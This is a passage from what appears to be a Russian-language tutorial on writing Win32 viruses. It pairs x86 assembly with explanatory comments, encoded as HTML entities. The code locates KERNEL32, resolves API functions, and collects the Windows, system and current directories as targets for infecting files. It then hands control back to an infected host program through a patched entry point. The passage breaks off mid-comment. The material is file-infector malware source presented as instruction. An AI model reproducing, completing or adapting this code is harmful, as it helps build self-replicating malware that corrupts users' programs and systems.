 ; &#1073;&#1091;&#1076;&#1091; &#1088;&#1072;&#1089;&#1089;&#1082;&#1072;&#1079;&#1099;&#1074;&#1072;&#1090;&#1100; &#1086; &#1076;&#1077;&#1083;&#1100;&#1090;&#1072;-&#1089;&#1084;&#1077;&#1097;&#1077;&#1085;&#1080;&#1080; &#1095;&#1090;&#1086;-&#1090;&#1086; &#1077;&#1097;&#1077;, &#1087;&#1086;&#1090;&#1086;&#1084;&#1091; &#1095;&#1090;&#1086; &#1103; &#1091;&#1074;&#1077;&#1088;&#1077;&#1085;, &#1095;&#1090;&#1086; ;
 ; &#1074;&#1099; &#1091;&#1079;&#1085;&#1072;&#1083;&#1080; &#1086;&#1073; &#1101;&#1090;&#1086;&#1084; &#1074;&#1089;&#1077;, &#1095;&#1090;&#1086; &#1085;&#1091;&#1078;&#1085;&#1086; &#1077;&#1097;&#1077; &#1074;&#1086; &#1074;&#1088;&#1077;&#1084;&#1103; &#1087;&#1088;&#1086;&#1075;&#1088;&#1072;&#1084;&#1084;&#1080;&#1088;&#1086;&#1074;&#1072;&#1085;&#1080;&#1103; &#1087;&#1086;&#1076; DOS   ;
 ; ;). &#1051;&#1072;&#1076;&#1085;&#1086;, &#1090;&#1077;&#1087;&#1077;&#1088;&#1100; &#1085;&#1072;&#1084; &#1085;&#1091;&#1078;&#1085;&#1086; &#1087;&#1086;&#1083;&#1091;&#1095;&#1080;&#1090;&#1100; &#1073;&#1072;&#1079;&#1091; &#1086;&#1073;&#1088;&#1072;&#1079;&#1072; &#1090;&#1077;&#1082;&#1091;&#1097;&#1077;&#1075;&#1086; &#1087;&#1088;&#1086;&#1094;&#1077;&#1089;&#1089;&#1072;. &#1069;&#1090;&#1086;  ;
 ; &#1085;&#1077;&#1086;&#1073;&#1093;&#1086;&#1076;&#1080;&#1084;&#1086; &#1076;&#1083;&#1103; &#1087;&#1086;&#1089;&#1083;&#1077;&#1076;&#1091;&#1102;&#1097;&#1077;&#1075;&#1086; &#1074;&#1086;&#1079;&#1074;&#1088;&#1072;&#1097;&#1077;&#1085;&#1080;&#1103; &#1091;&#1087;&#1088;&#1072;&#1074;&#1083;&#1077;&#1085;&#1080;&#1103; &#1085;&#1086;&#1089;&#1080;&#1090;&#1077;&#1083;&#1102; (&#1095;&#1090;&#1086; &#1073;&#1091;&#1076;&#1077;&#1090;   ;
 ; &#1089;&#1076;&#1077;&#1083;&#1072;&#1085;&#1086; &#1087;&#1086;&#1079;&#1078;&#1077;). &#1057;&#1085;&#1072;&#1095;&#1072;&#1083;&#1072; &#1084;&#1099; &#1074;&#1099;&#1095;&#1080;&#1090;&#1072;&#1077;&#1084; &#1073;&#1072;&#1079;&#1099; &#1084;&#1077;&#1078;&#1076;&#1091; &#1084;&#1077;&#1090;&#1082;&#1086;&#1081; delta &#1080; aztec      ;
 ; (7 bytes-&gt;PUSHAD (1)+PUSHFD (1)+CALL (5)), &#1087;&#1086;&#1089;&#1083;&#1077; &#1095;&#1077;&#1075;&#1086; &#1084;&#1099; &#1074;&#1099;&#1095;&#1080;&#1090;&#1072;&#1077;&#1084;        ;
 ; &#1090;&#1077;&#1082;&#1091;&#1097;&#1080;&#1081; EIP (&#1087;&#1088;&#1086;&#1087;&#1072;&#1090;&#1095;&#1077;&#1085;&#1085;&#1099;&#1081; &#1074;&#1086; &#1074;&#1088;&#1077;&#1084;&#1103; &#1079;&#1072;&#1088;&#1072;&#1078;&#1077;&#1085;&#1080;&#1103;) &#1080; &#1074;&#1091;&#1072;&#1083;&#1103;! &#1059; &#1085;&#1072;&#1089; &#1077;&#1089;&#1090;&#1100; &#1073;&#1072;&#1079;&#1072;   ;
 ; &#1086;&#1073;&#1088;&#1072;&#1079;&#1072;.                                                                  ;
 ;-------------------------------------;

        mov     esi,[esp+24h]                   ; &#1055;&#1086;&#1083;&#1091;&#1095;&#1072;&#1077;&#1084; &#1072;&#1076;&#1088;&#1077;&#1089; &#1074;&#1086;&#1079;&#1074;&#1088;&#1072;&#1090;&#1072;
                                                ; &#1087;&#1088;&#1086;&#1075;&#1088;&#1072;&#1084;&#1084;&#1099;
        and     esi,0FFFF0000h                  ; &#1042;&#1099;&#1088;&#1072;&#1074;&#1085;&#1080;&#1074;&#1072;&#1077;&#1084; &#1085;&#1072; 10 &#1089;&#1090;&#1088;&#1072;&#1085;&#1080;&#1094;
        mov     ecx,5                           ; 50 &#1089;&#1090;&#1088;&#1072;&#1085;&#1080;&#1094; (&#1074; &#1075;&#1088;&#1091;&#1087;&#1087;&#1072;&#1093; &#1087;&#1086;
                                                ; 10)
        call    GetK32                          ; &#1042;&#1099;&#1079;&#1099;&#1074;&#1072;&#1077;&#1084; &#1087;&#1088;&#1086;&#1094;&#1077;&#1076;&#1091;&#1088;&#1091;
        mov     dword ptr [ebp+kernel],eax      ; EAX &#1073;&#1091;&#1076;&#1077;&#1090; &#1089;&#1086;&#1076;&#1077;&#1088;&#1078;&#1072;&#1090;&#1100; &#1072;&#1076;&#1088;&#1077;&#1089;
                                                ; &#1073;&#1072;&#1079;&#1099; &#1086;&#1073;&#1088;&#1072;&#1079;&#1072; K32

 ;-------------------------------------;
 ; &#1057;&#1085;&#1072;&#1095;&#1072;&#1083;&#1072; &#1084;&#1099; &#1087;&#1086;&#1084;&#1077;&#1097;&#1072;&#1077;&#1084; &#1074; ESI &#1072;&#1076;&#1088;&#1077;&#1089;, &#1086;&#1090;&#1082;&#1091;&#1076;&#1072; &#1073;&#1099;&#1083; &#1074;&#1099;&#1079;&#1074;&#1072;&#1085; &#1087;&#1088;&#1086;&#1094;&#1077;&#1089;&#1089; (&#1086;&#1085; &#1085;&#1072;&#1093;&#1086;&#1076;&#1080;&#1090;&#1089;&#1103; ;
 ; &#1074; KERNEL32.DLL, &#1074;&#1077;&#1088;&#1086;&#1103;&#1090;&#1085;&#1086; API-&#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1103; CreateProcess). &#1048;&#1079;&#1085;&#1072;&#1095;&#1072;&#1083;&#1100;&#1085;&#1086; &#1101;&#1090;&#1086;      ;
 ; &#1072;&#1076;&#1088;&#1077;&#1089;, &#1085;&#1072; &#1082;&#1086;&#1090;&#1086;&#1088;&#1099;&#1081; &#1091;&#1082;&#1072;&#1079;&#1099;&#1074;&#1072;&#1077;&#1090; ESP, &#1085;&#1086; &#1090;&#1072;&#1082; &#1082;&#1072;&#1082; &#1084;&#1099; &#1087;&#1086;&#1084;&#1077;&#1089;&#1090;&#1080;&#1083;&#1080; &#1074; &#1089;&#1090;&#1077;&#1082; 24 &#1073;&#1072;&#1081;&#1090;&#1072; ;
 ; (20 &#1080;&#1089;&#1087;&#1086;&#1083;&#1100;&#1079;&#1086;&#1074;&#1072;&#1083; PUSHAD, &#1076;&#1088;&#1091;&#1075;&#1080;&#1077; 4 - PUSHFD), &#1085;&#1072;&#1084; &#1085;&#1077;&#1086;&#1073;&#1093;&#1086;&#1076;&#1080;&#1084;&#1086; &#1101;&#1090;&#1086; &#1091;&#1095;&#1077;&#1089;&#1090;&#1100;. &#1040; ;
 ; &#1087;&#1086;&#1089;&#1083;&#1077; &#1101;&#1090;&#1086;&#1075;&#1086; &#1084;&#1099; &#1074;&#1099;&#1088;&#1072;&#1074;&#1085;&#1080;&#1074;&#1072;&#1077;&#1084; &#1077;&#1075;&#1086; &#1085;&#1072; 10 &#1089;&#1090;&#1088;&#1072;&#1085;&#1080;&#1094;, &#1076;&#1077;&#1083;&#1072;&#1103; &#1089;&#1072;&#1084;&#1086;&#1077; &#1084;&#1083;&#1072;&#1076;&#1096;&#1077;&#1077; &#1089;&#1083;&#1086;&#1074;&#1072;  ;
 ; &#1088;&#1072;&#1074;&#1085;&#1099;&#1084; &#1085;&#1091;&#1083;&#1102;. &#1055;&#1086;&#1089;&#1083;&#1077; &#1101;&#1090;&#1086;&#1075;&#1086; &#1084;&#1099; &#1091;&#1089;&#1090;&#1072;&#1085;&#1072;&#1074;&#1083;&#1080;&#1074;&#1072;&#1077;&#1084; &#1076;&#1088;&#1091;&#1075;&#1080;&#1077; &#1087;&#1072;&#1088;&#1072;&#1084;&#1077;&#1090;&#1088;&#1099; &#1076;&#1083;&#1103; &#1087;&#1088;&#1086;&#1094;&#1077;&#1076;&#1091;&#1088;&#1099; ;
 ; GetK32, ECX, &#1082;&#1086;&#1090;&#1086;&#1088;&#1099;&#1081; &#1089;&#1086;&#1076;&#1077;&#1088;&#1078;&#1080;&#1090; &#1084;&#1072;&#1082;&#1089;&#1080;&#1084;&#1072;&#1083;&#1100;&#1085;&#1086;&#1077; &#1082;&#1086;&#1083;&#1080;&#1095;&#1077;&#1089;&#1090;&#1074;&#1086; &#1075;&#1088;&#1091;&#1087;&#1087; &#1087;&#1086; 10        ;
 ; &#1089;&#1090;&#1088;&#1072;&#1085;&#1080;&#1094;, &#1076;&#1077;&#1083;&#1072;&#1077;&#1084; &#1088;&#1072;&#1074;&#1085;&#1099;&#1084; 5 (&#1095;&#1090;&#1086; &#1076;&#1072;&#1077;&#1090; 5*10=50 &#1089;&#1090;&#1088;&#1072;&#1085;&#1080;&#1094;), &#1072; &#1087;&#1086;&#1089;&#1083;&#1077; &#1095;&#1077;&#1075;&#1086; &#1084;&#1099;     ;
 ; &#1074;&#1099;&#1079;&#1099;&#1074;&#1072;&#1077;&#1084; &#1087;&#1088;&#1086;&#1094;&#1077;&#1076;&#1091;&#1088;&#1091;. &#1050;&#1072;&#1082; &#1090;&#1086;&#1083;&#1100;&#1082;&#1086; &#1086;&#1085;&#1072; &#1074;&#1077;&#1088;&#1085;&#1077;&#1090; &#1085;&#1072;&#1084; &#1087;&#1088;&#1072;&#1074;&#1080;&#1083;&#1100;&#1085;&#1099;&#1081; &#1072;&#1076;&#1088;&#1077;&#1089; &#1073;&#1072;&#1079;&#1099;      ;
 ; KERNEL32, &#1084;&#1099; &#1077;&#1075;&#1086; &#1089;&#1086;&#1093;&#1088;&#1072;&#1085;&#1103;&#1077;&#1084;.                                              ;
 ;-------------------------------------;

        lea     edi,[ebp+@@Offsetz]
        lea     esi,[ebp+@@Namez]
        call    GetAPIs                         ; &#1055;&#1086;&#1083;&#1091;&#1095;&#1072;&#1077;&#1084; &#1074;&#1089;&#1077; API-&#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1080;

        call    PrepareInfection
        call    InfectItAll

 ;-------------------------------------;
 ; &#1057;&#1085;&#1072;&#1095;&#1072;&#1083;&#1072; &#1084;&#1099; &#1079;&#1072;&#1076;&#1072;&#1077;&#1084; &#1087;&#1072;&#1088;&#1072;&#1084;&#1077;&#1090;&#1088;&#1099; &#1087;&#1088;&#1086;&#1094;&#1077;&#1076;&#1091;&#1088;&#1099; GetAPIs: EDI, &#1091;&#1082;&#1072;&#1079;&#1099;&#1074;&#1072;&#1102;&#1097;&#1080;&#1081; &#1085;&#1072;       ;
 ; &#1084;&#1072;&#1089;&#1089;&#1080;&#1074; DWORD'&#1086;&#1074;, &#1082;&#1086;&#1090;&#1086;&#1088;&#1099;&#1077; &#1073;&#1091;&#1076;&#1091;&#1090; &#1089;&#1086;&#1076;&#1077;&#1088;&#1078;&#1072;&#1090;&#1100; &#1072;&#1076;&#1088;&#1077;&#1089;&#1072; API-&#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1081; &#1080; ESI,       ;
 ; &#1091;&#1082;&#1072;&#1079;&#1099;&#1074;&#1072;&#1102;&#1097;&#1080;&#1081; &#1085;&#1072; &#1080;&#1084;&#1077;&#1085;&#1072; API-&#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1081; (&#1074; &#1092;&#1086;&#1088;&#1084;&#1072;&#1090;&#1077; ASCIIz), &#1082;&#1086;&#1090;&#1086;&#1088;&#1099;&#1077; &#1085;&#1077;&#1086;&#1073;&#1093;&#1086;&#1076;&#1080;&#1084;&#1086;  ;
 ; &#1085;&#1072;&#1081;&#1090;&#1080;.                                                                   ;
 ;-------------------------------------;

        xchg    ebp,ecx                         ; &#1069;&#1090;&#1086; &#1087;&#1077;&#1088;&#1074;&#1086;&#1077; &#1087;&#1086;&#1082;&#1086;&#1083;&#1077;&#1085;&#1080;&#1077;?
        jecxz   fakehost

        popfd                                   ; &#1042;&#1086;&#1089;&#1089;&#1090;&#1072;&#1085;&#1072;&#1074;&#1083;&#1080;&#1074;&#1072;&#1077;&#1084; &#1074;&#1089;&#1077; &#1092;&#1083;&#1072;&#1075;&#1080;
        popad                                   ; &#1042;&#1086;&#1089;&#1089;&#1090;&#1072;&#1085;&#1072;&#1074;&#1083;&#1080;&#1074;&#1072;&#1077;&#1084; &#1074;&#1089;&#1077;
                                                ; &#1088;&#1077;&#1075;&#1080;&#1089;&#1090;&#1088;&#1099;

        mov     eax,12345678h
        org     $-4
OldEIP  dd      00001000h

        add     eax,12345678h
        org     $-4
ModBase dd      00400000h

        jmp     eax

 ;-------------------------------------;
 ; &#1057;&#1085;&#1072;&#1095;&#1072;&#1083;&#1072; &#1084;&#1099; &#1089;&#1084;&#1086;&#1090;&#1088;&#1080;&#1084;, &#1085;&#1077; &#1103;&#1074;&#1083;&#1103;&#1077;&#1090;&#1089;&#1103; &#1083;&#1080; &#1076;&#1072;&#1085;&#1085;&#1086;&#1077; &#1087;&#1086;&#1082;&#1086;&#1083;&#1077;&#1085;&#1080;&#1077; &#1074;&#1080;&#1088;&#1091;&#1089;&#1072; &#1087;&#1077;&#1088;&#1074;&#1099;&#1084;,       ;
 ; &#1087;&#1088;&#1086;&#1074;&#1077;&#1088;&#1103;&#1103; &#1085;&#1077; &#1088;&#1072;&#1074;&#1077;&#1085; &#1083;&#1080; EBP &#1085;&#1091;&#1083;&#1102;. &#1045;&#1089;&#1083;&#1080; &#1101;&#1090;&#1086; &#1090;&#1072;&#1082;, &#1090;&#1086; &#1084;&#1099; &#1087;&#1077;&#1088;&#1077;&#1093;&#1086;&#1076;&#1080;&#1084; &#1082; &#1085;&#1086;&#1089;&#1080;&#1090;&#1077;&#1083;&#1102;  ;
 ; &#1087;&#1077;&#1088;&#1074;&#1086;&#1075;&#1086; &#1087;&#1086;&#1082;&#1086;&#1083;&#1077;&#1085;&#1080;&#1103;. &#1045;&#1089;&#1083;&#1080; &#1101;&#1090;&#1086; &#1085;&#1077; &#1090;&#1072;&#1082;, &#1084;&#1099; &#1074;&#1086;&#1089;&#1089;&#1090;&#1072;&#1085;&#1072;&#1074;&#1083;&#1080;&#1074;&#1072;&#1077;&#1084; &#1080;&#1079; &#1089;&#1090;&#1077;&#1082;&#1072; &#1088;&#1077;&#1075;&#1080;&#1089;&#1090;&#1088;  ;
 ; &#1092;&#1083;&#1072;&#1075;&#1086;&#1074; &#1080; &#1074;&#1089;&#1077; &#1088;&#1072;&#1089;&#1096;&#1080;&#1088;&#1077;&#1085;&#1085;&#1099;&#1077; &#1088;&#1077;&#1075;&#1080;&#1089;&#1090;&#1088;&#1099;. &#1055;&#1086;&#1089;&#1083;&#1077; &#1101;&#1090;&#1086; &#1080;&#1076;&#1077;&#1090; &#1080;&#1085;&#1089;&#1090;&#1088;&#1091;&#1082;&#1094;&#1080;&#1103;, &#1087;&#1086;&#1084;&#1077;&#1097;&#1072;&#1102;&#1097;&#1072;&#1103; ;
 ; &#1074; EAX &#1089;&#1090;&#1072;&#1088;&#1091;&#1102; &#1090;&#1086;&#1095;&#1082;&#1091; &#1074;&#1093;&#1086;&#1076;&#1072; &#1079;&#1072;&#1088;&#1072;&#1078;&#1077;&#1085;&#1085;&#1086;&#1081; &#1087;&#1088;&#1086;&#1075;&#1088;&#1072;&#1084;&#1084;&#1099; (&#1101;&#1090;&#1086; &#1087;&#1072;&#1090;&#1095;&#1080;&#1090;&#1089;&#1103; &#1074;&#1086; &#1074;&#1088;&#1077;&#1084;&#1103;     ;
 ; &#1079;&#1072;&#1088;&#1072;&#1078;&#1077;&#1085;&#1080;&#1103;), &#1072; &#1079;&#1072;&#1090;&#1077;&#1084; &#1084;&#1099; &#1076;&#1086;&#1073;&#1072;&#1074;&#1083;&#1103;&#1077;&#1084; &#1082; &#1085;&#1077;&#1081; &#1072;&#1076;&#1088;&#1077;&#1089; &#1073;&#1072;&#1079;&#1099; &#1090;&#1077;&#1082;&#1091;&#1097;&#1077;&#1075;&#1086; &#1087;&#1088;&#1086;&#1094;&#1077;&#1089;&#1089;&#1072;      ;
 ; (&#1087;&#1072;&#1090;&#1095;&#1080;&#1090;&#1089;&#1103; &#1074;&#1086; &#1074;&#1088;&#1077;&#1084;&#1103; &#1074;&#1099;&#1087;&#1086;&#1083;&#1085;&#1077;&#1085;&#1080;&#1103;).                                          ;
 ;-------------------------------------;

PrepareInfection:
        lea     edi,[ebp+WindowsDir]            ; &#1059;&#1082;&#1072;&#1079;&#1072;&#1090;&#1077;&#1083;&#1100; &#1085;&#1072; 1&#1091;&#1102; &#1076;&#1080;&#1088;&#1077;&#1082;&#1090;&#1086;&#1088;.
        push    7Fh                             ; &#1056;&#1072;&#1079;&#1084;&#1077;&#1088; &#1073;&#1091;&#1092;&#1077;&#1088;&#1072;
        push    edi                             ; &#1040;&#1076;&#1088;&#1077;&#1089; &#1073;&#1091;&#1092;&#1077;&#1088;&#1072;
        call    [ebp+_GetWindowsDirectoryA]     ; &#1055;&#1086;&#1083;&#1091;&#1095;&#1072;&#1077;&#1084; &#1076;&#1080;&#1088;&#1077;&#1082;&#1090;&#1086;&#1088;&#1080;&#1102; Windows

        add     edi,7Fh                         ; &#1059;&#1082;&#1072;&#1079;&#1072;&#1090;&#1077;&#1083;&#1100; &#1085;&#1072; 2&#1091;&#1102; &#1076;&#1080;&#1088;&#1077;&#1082;&#1090;&#1086;&#1088;.
        push    7Fh                             ; &#1056;&#1072;&#1079;&#1084;&#1077;&#1088; &#1073;&#1091;&#1092;&#1077;&#1088;&#1072;
        push    edi                             ; &#1040;&#1076;&#1088;&#1077;&#1089; &#1073;&#1091;&#1092;&#1077;&#1088;&#1072;
        call    [ebp+_GetSystemDirectoryA]      ; &#1055;&#1086;&#1083;&#1091;&#1095;&#1072;&#1077;&#1084; &#1089;&#1080;&#1089;&#1090;&#1077;&#1084;&#1085;&#1091;&#1102; &#1076;&#1080;&#1088;.

        add     edi,7Fh                         ; &#1059;&#1082;&#1072;&#1079;&#1072;&#1090;&#1077;&#1083;&#1100; &#1085;&#1072; 3&#1100;&#1102; &#1076;&#1080;&#1088;&#1077;&#1082;&#1090;&#1086;&#1088;.
        push    edi                             ; &#1040;&#1076;&#1088;&#1077;&#1089; &#1073;&#1091;&#1092;&#1077;&#1088;&#1072;
        push    7Fh                             ; &#1056;&#1072;&#1079;&#1084;&#1077;&#1088; &#1073;&#1091;&#1092;&#1077;&#1088;&#1072;
        call    [ebp+_GetCurrentDirectoryA]     ; &#1055;&#1086;&#1083;&#1091;&#1095;&#1072;&#1077;&#1084; &#1090;&#1077;&#1082;&#1091;&#1097;&#1091;&#1102; &#1076;&#1080;&#1088;&#1077;&#1082;&#1090;&#1086;&#1088;&#1080;&#1102;
        ret

 ;-------------------------------------;
 ; &#1054;&#1082;, &#1101;&#1090;&#1086; &#1087;&#1088;&#1086;&#1089;&#1090;&#1072;&#1103; &#1087;&#1088;&#1086;&#1094;&#1077;&#1076;&#1091;&#1088;&#1072;, &#1082;&#1086;&#1090;&#1086;&#1088;&#1072;&#1103; &#1080;&#1089;&#1087;&#1086;&#1083;&#1100;&#1079;&#1091;&#1077;&#1090;&#1089;&#1103; &#1076;&#1083;&#1103; &#1087;&#1086;&#1083;&#1091;&#1095;&#1077;&#1085;&#1080;&#1103; &#1074;&#1089;&#1077;&#1093;       ;
 ; &#1076;&#1080;&#1088;&#1077;&#1082;&#1090;&#1086;&#1088;&#1080;&#1081;, &#1075;&#1076;&#1077; &#1074;&#1080;&#1088;&#1091;&#1089; &#1073;&#1091;&#1076;&#1077;&#1090; &#1080;&#1089;&#1082;&#1072;&#1090;&#1100; &#1092;&#1072;&#1081;&#1083;&#1099; &#1076;&#1083;&#1103; &#1079;&#1072;&#1088;&#1072;&#1078;&#1077;&#1085;&#1080;&#1103;. &#1058;&#1072;&#1082; &#1082;&#1072;&#1082;          ;
 ; &#1084;&#1072;&#1089;&#1080;&#1084;&#1072;&#1083;&#1100;&#1085;&#1072;&#1103; &#1076;&#1083;&#1080;&#1085;&#1072; &#1076;&#1080;&#1088;&#1077;&#1082;&#1090;&#1086;&#1088;&#1080;&#1080; 7F &#1073;&#1072;&#1081;&#1090;&#1086;&#1074;, &#1103; &#1087;&#1086;&#1084;&#1077;&#1097;&#1072;&#1102; &#1074; &#1082;&#1091;&#1095;&#1091; (&#1089;&#1084;&#1086;&#1090;&#1088;&#1080; &#1085;&#1080;&#1078;&#1077;)   ;
 ; &#1090;&#1088;&#1080; &#1087;&#1077;&#1088;&#1077;&#1084;&#1077;&#1085;&#1085;&#1099;&#1093;, &#1080;&#1079;&#1073;&#1077;&#1075;&#1072;&#1103; &#1083;&#1080;&#1096;&#1085;&#1080;&#1093; &#1073;&#1072;&#1081;&#1090;&#1086;&#1074; &#1080; &#1073;&#1077;&#1089;&#1087;&#1086;&#1083;&#1077;&#1079;&#1085;&#1085;&#1099;&#1093; &#1076;&#1072;&#1085;&#1085;&#1099;&#1093;. &#1054;&#1073;&#1088;&#1072;&#1090;&#1080;&#1090;&#1077;    ;
 ; &#1074;&#1085;&#1080;&#1084;&#1072;&#1085;&#1080;&#1077;, &#1095;&#1090;&#1086; &#1074; &#1087;&#1086;&#1089;&#1083;&#1077;&#1076;&#1085;&#1077;&#1084; &#1074;&#1099;&#1079;&#1086;&#1074;&#1077; API-&#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1080; &#1085;&#1077;&#1090; &#1085;&#1080;&#1082;&#1072;&#1082;&#1080;&#1093; &#1086;&#1096;&#1080;&#1073;&#1086;&#1082;. &#1044;&#1072;&#1074;&#1072;&#1081;&#1090;&#1077; ;
 ; &#1075;&#1083;&#1091;&#1073;&#1078;&#1077; &#1087;&#1088;&#1086;&#1072;&#1085;&#1072;&#1083;&#1080;&#1079;&#1080;&#1088;&#1091;&#1077;&#1084; &#1101;&#1090;&#1080; &#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1080;:                                       ;
 ;                                                                          ;
 ; &#1060;&#1091;&#1085;&#1082;&#1094;&#1080;&#1103; GetWindowsDirectory &#1087;&#1086;&#1083;&#1091;&#1095;&#1072;&#1077;&#1090; &#1087;&#1091;&#1090;&#1100; &#1082; &#1076;&#1080;&#1088;&#1077;&#1082;&#1090;&#1086;&#1088;&#1080;&#1080; Windows.          ;
 ; &#1044;&#1080;&#1088;&#1077;&#1082;&#1090;&#1086;&#1088;&#1080;&#1103; Windows &#1089;&#1086;&#1076;&#1077;&#1088;&#1078;&#1080;&#1090; &#1088;&#1072;&#1079;&#1083;&#1080;&#1095;&#1085;&#1099;&#1077; &#1087;&#1088;&#1080;&#1083;&#1086;&#1078;&#1077;&#1085;&#1080;&#1103;, &#1080;&#1085;&#1080;&#1094;&#1080;&#1072;&#1083;&#1080;&#1079;&#1072;&#1094;&#1080;&#1086;&#1085;&#1085;&#1099;&#1077;      ;
 ; &#1092;&#1072;&#1081;&#1083;&#1099; &#1080; &#1092;&#1072;&#1081;&#1083;&#1099; &#1087;&#1086;&#1084;&#1086;&#1097;&#1080;.                                                    ;
 ;                                                                          ;
 ; UINT GetWindowsDirectory(                                                ;
 ;   LPTSTR lpBuffer,    // &#1072;&#1076;&#1088;&#1077;&#1089; &#1073;&#1091;&#1092;&#1077;&#1088;&#1072; &#1076;&#1083;&#1103; &#1076;&#1080;&#1088;&#1077;&#1082;&#1090;&#1086;&#1088;&#1080;&#1080; Windows             ;
 ;   UINT uSize  // &#1088;&#1072;&#1079;&#1084;&#1077;&#1088; &#1073;&#1091;&#1092;&#1077;&#1088;&#1072;                                           ;
 ;  );                                                                      ;
 ;                                                                          ;
 ; &#1055;&#1072;&#1088;&#1072;&#1084;&#1077;&#1090;&#1088;&#1099;                                                                ;
 ; ---------                                                                ;
 ;  lpBuffer: &#1091;&#1082;&#1072;&#1079;&#1099;&#1074;&#1072;&#1077;&#1090; &#1085;&#1072; &#1073;&#1091;&#1092;&#1077;&#1088;, &#1074; &#1082;&#1086;&#1090;&#1086;&#1088;&#1086;&#1084; &#1073;&#1091;&#1076;&#1077;&#1090; &#1087;&#1086;&#1084;&#1077;&#1097;&#1077;&#1085; &#1087;&#1091;&#1090;&#1100; &#1082;           ;
 ;   &#1076;&#1080;&#1088;&#1077;&#1082;&#1090;&#1086;&#1088;&#1080;&#1080;. &#1069;&#1090;&#1086;&#1090; &#1087;&#1091;&#1090;&#1100; &#1085;&#1077; &#1073;&#1091;&#1076;&#1077;&#1090; &#1079;&#1072;&#1082;&#1072;&#1085;&#1095;&#1080;&#1074;&#1072;&#1090;&#1100;&#1089;&#1103; &#1089;&#1083;&#1077;&#1096;&#1086;&#1084;, &#1077;&#1089;&#1083;&#1080; &#1090;&#1086;&#1083;&#1100;&#1082;&#1086;       ;
 ;   &#1076;&#1080;&#1088;&#1077;&#1082;&#1090;&#1086;&#1088;&#1080;&#1077;&#1081; Windows &#1085;&#1077; &#1103;&#1074;&#1083;&#1103;&#1077;&#1090;&#1089;&#1103; &#1082;&#1086;&#1088;&#1085;&#1077;&#1074;&#1072;&#1103; &#1076;&#1080;&#1088;&#1077;&#1082;&#1090;&#1086;&#1088;&#1080;&#1103;. &#1053;&#1072;&#1087;&#1088;&#1080;&#1084;&#1077;&#1088;, &#1077;&#1089;&#1083;&#1080;    ;
 ;   &#1076;&#1080;&#1088;&#1077;&#1082;&#1090;&#1086;&#1088;&#1080;&#1103; Windows - &#1101;&#1090;&#1086; &#1087;&#1072;&#1087;&#1082;&#1072; WINDOWS &#1085;&#1072; &#1076;&#1080;&#1089;&#1082;&#1077; C, &#1090;&#1086; &#1087;&#1091;&#1090;&#1100; &#1087;&#1086;&#1083;&#1091;&#1095;&#1077;&#1085;&#1085;&#1099;&#1081;  ;
 ;   &#1087;&#1091;&#1090;&#1100; &#1082; &#1076;&#1080;&#1088;&#1077;&#1082;&#1090;&#1086;&#1088;&#1080;&#1080; Windows &#1073;&#1091;&#1076;&#1077;&#1090; &quot;C:\WINDOWS&quot;. &#1045;&#1089;&#1083;&#1080; Windows &#1073;&#1099;&#1083;&#1072;        ;
 ;   &#1080;&#1085;&#1089;&#1090;&#1072;&#1083;&#1083;&#1080;&#1088;&#1086;&#1074;&#1072;&#1085;&#1072; &#1074; &#1082;&#1086;&#1088;&#1085;&#1077;&#1074;&#1086;&#1081; &#1076;&#1080;&#1088;&#1077;&#1082;&#1090;&#1086;&#1088;&#1080;&#1080; &#1076;&#1080;&#1089;&#1082;&#1072; C, &#1090;&#1086; &#1087;&#1086;&#1083;&#1091;&#1095;&#1077;&#1085;&#1085;&#1099;&#1081; &#1087;&#1091;&#1090;&#1100; &#1073;&#1091;&#1076;&#1077;&#1090; ;
 ;   &quot;C:\&quot;.                                                                 ;
 ;  uSize: &#1059;&#1082;&#1072;&#1079;&#1099;&#1074;&#1072;&#1077;&#1090; &#1084;&#1072;&#1082;&#1089;&#1080;&#1084;&#1072;&#1083;&#1100;&#1085;&#1099;&#1081; &#1088;&#1072;&#1079;&#1084;&#1077;&#1088; &#1074; &#1089;&#1080;&#1084;&#1074;&#1086;&#1083;&#1072;&#1093; &#1073;&#1091;&#1092;&#1077;&#1088;&#1072;, &#1082;&#1086;&#1090;&#1086;&#1088;&#1099;&#1081; &#1079;&#1072;&#1076;&#1072;&#1085;  ;
 ;   &#1087;&#1072;&#1088;&#1072;&#1084;&#1077;&#1090;&#1086;&#1088;&#1086;&#1084; lpBuffer. &#1069;&#1090;&#1086; &#1079;&#1085;&#1072;&#1095;&#1077;&#1085;&#1080;&#1077; &#1076;&#1086;&#1083;&#1078;&#1085;&#1086; &#1073;&#1099;&#1090;&#1100; &#1088;&#1072;&#1074;&#1085;&#1086; &#1087;&#1086; &#1082;&#1088;&#1072;&#1081;&#1085;&#1077;&#1081; &#1084;&#1077;&#1088;&#1077;   ;
 ;   MAX_PATH, &#1095;&#1090;&#1086;&#1073;&#1099; &#1086;&#1073;&#1077;&#1089;&#1087;&#1077;&#1095;&#1080;&#1090;&#1100; &#1076;&#1086;&#1089;&#1090;&#1072;&#1090;&#1086;&#1095;&#1085;&#1086;&#1077; &#1082;&#1086;&#1083;&#1080;&#1095;&#1077;&#1089;&#1090;&#1074;&#1086; &#1084;&#1077;&#1089;&#1090;&#1072; &#1074; &#1073;&#1091;&#1092;&#1077;&#1088;&#1077; &#1076;&#1083;&#1103;   ;
 ;   &#1087;&#1091;&#1090;&#1080;.                                                                  ;
 ;                                                                          ;
 ; Return Values                                                            ;
 ; -------------                                                            ;
 ; &#1042;&#1086;&#1079;&#1074;&#1088;&#1072;&#1097;&#1072;&#1077;&#1084;&#1099;&#1077; &#1079;&#1085;&#1072;&#1095;&#1077;&#1085;&#1080;&#1103;                                                    ;
 ; ---------------------                                                    ;
 ;                                                                          ;
 ;  &#1045;&#1089;&#1083;&#1080; &#1074;&#1099;&#1079;&#1086;&#1074; &#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1080; &#1087;&#1088;&#1086;&#1096;&#1077;&#1083; &#1091;&#1089;&#1087;&#1077;&#1096;&#1085;&#1086;, &#1074;&#1086;&#1079;&#1074;&#1088;&#1072;&#1097;&#1072;&#1077;&#1084;&#1086;&#1077; &#1079;&#1085;&#1072;&#1095;&#1077;&#1085;&#1080;&#1077; - &#1101;&#1090;&#1086; &#1076;&#1083;&#1080;&#1085;&#1072;   ;
